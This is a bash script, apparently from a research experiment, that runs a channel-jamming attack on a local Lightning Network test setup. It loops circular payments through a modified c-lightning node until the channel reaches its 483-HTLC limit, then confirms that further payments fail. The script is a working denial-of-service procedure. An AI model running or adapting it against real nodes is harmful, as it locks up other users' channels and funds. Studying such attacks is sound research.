#!/bin/bash

# actors: Alice, Crol
# channels: Crol->Alice->Crol
# Use case: loop of len 2 succeeds (back and forth). We run this payment 241 times, to see we reach 482 htlcs, we add 
# 1 payment to reach 483 htlcs and block the channel. We check the channel is indeed blocked.
# Change in c-lightning code: Crol does not return secret (invoice.c), before timeout Crol sends update_fail_htlc (peer_htlcs.c)..

HOME='/home/ayelet'
. $HOME/.lightning/scripts/logger.sh

log_file="$HOME/.lightning/logs/exp7_attack_back_forth_path_htlc_max$(date +'%d-%m-%Y-%H:%M:%S').log"

Alice_port=27592
Crol_port=27594
amount_to_insert_lwallet=6
amount_to_insert_channel=16777215
payment_amount=100

. $HOME/.lightning/scripts/functions.sh -G $log_file

$HOME/.lightning/scripts/start_nodes.sh -G $log_file


create_channel Crol Alice $Alice_port $amount_to_insert_lwallet $amount_to_insert_channel

withdraw_remaining_amount Crol


alice_id=''
get_node_id Alice alice_id
crol_id=''
get_node_id Crol crol_id
sleep 2s

edebug "number of blocks: $(bitcoin-cli -datadir=$HOME/.bitcoin/Network getblockcount)" |& tee -a $log_file

#### Phase 1: Crol pays Alice #####

einfo "\n####### Phase 1: Crol pays Alice #######" |& tee -a $log_file

print_channel_balances Crol Alice

inv=$($HOME/lightning/cli/lightning-cli --rpc-file=$HOME/.lightning/Alice/lightning-rpc invoice 2000000000 "Alice_to_Crol-$(date +'%T:%N')" "$(date +'%T:%N') tx of 200000000 msat from Alice to Crol")

einfo "$inv" |& tee -a $log_file

bolt11=$(jq '.bolt11' <<< "$inv")

$HOME/lightning/cli/lightning-cli --rpc-file=$HOME/.lightning/Crol/lightning-rpc pay $bolt11

print_channel_balances Crol Alice

#### Phase 2: Crol pays herself #####

einfo "\n####### Phase 2: Crol transfers money to herself through the lightning channel in a circular route #######" |& tee -a $log_file

for iteration in {1..241}
do

	edebug "\npayment iteration $iteration" |& tee -a $log_file

	inv=$($HOME/lightning/cli/lightning-cli --rpc-file=$HOME/.lightning/Crol/lightning-rpc invoice $payment_amount "a-$(date +'%T:%N') $iteration" "$(date +'%T:%N') tx of $payment_amount msat a $iteration")

	einfo "$inv" |& tee -a $log_file

	payment_hash=$(jq '.payment_hash' <<< "$inv")

	route="[
	 {
	    \"id\" : \"$alice_id\",
	    \"channel\" : \"105x1x0\",
	    \"direction\" : 0,
	    \"msatoshi\" : $((payment_amount+1)),
	    \"amount_msat\" : \"$((payment_amount+1))msat\",
	    \"delay\" : 15
	 },
	{
	    \"id\" : \"$crol_id\",
	    \"channel\" : \"105x1x0\",
	    \"direction\" : 0,
	    \"msatoshi\" : $payment_amount,
	    \"amount_msat\" : \"${payment_amount}msat\",
	    \"delay\" : 9
	 }
	]"

	echo "route=$route" |& tee -a $log_file

	sleep 2s

	$HOME/lightning/cli/lightning-cli --rpc-file=$HOME/.lightning/Crol/lightning-rpc sendpay "$route" $payment_hash  &
	$HOME/lightning/cli/lightning-cli --rpc-file=$HOME/.lightning/Crol/lightning-rpc waitsendpay $payment_hash

done

print_channel_balances Crol Alice

sleep 10s

einfo "add the 483th payment"

inv=$($HOME/lightning/cli/lightning-cli --rpc-file=$HOME/.lightning/Crol/lightning-rpc invoice $payment_amount "Alice_to_Crol-$(date +'%T:%N')" "$(date +'%T:%N') tx of $payment_amount msat from Alice to Crol")

einfo "$inv" |& tee -a $log_file

bolt11=$(jq '.bolt11' <<< "$inv")

$HOME/lightning/cli/lightning-cli --rpc-file=$HOME/.lightning/Alice/lightning-rpc pay $bolt11 &

print_channel_balances Crol Alice

sleep 10s

einfo "try the 484th payment - expected to fail"

inv=$($HOME/lightning/cli/lightning-cli --rpc-file=$HOME/.lightning/Crol/lightning-rpc invoice $payment_amount "Alice_to_Crol-$(date +'%T:%N')" "$(date +'%T:%N') tx of $payment_amount msat from Alice to Crol")

einfo "$inv" |& tee -a $log_file

bolt11=$(jq '.bolt11' <<< "$inv")

$HOME/lightning/cli/lightning-cli --rpc-file=$HOME/.lightning/Alice/lightning-rpc pay $bolt11 &

print_channel_balances Crol Alice

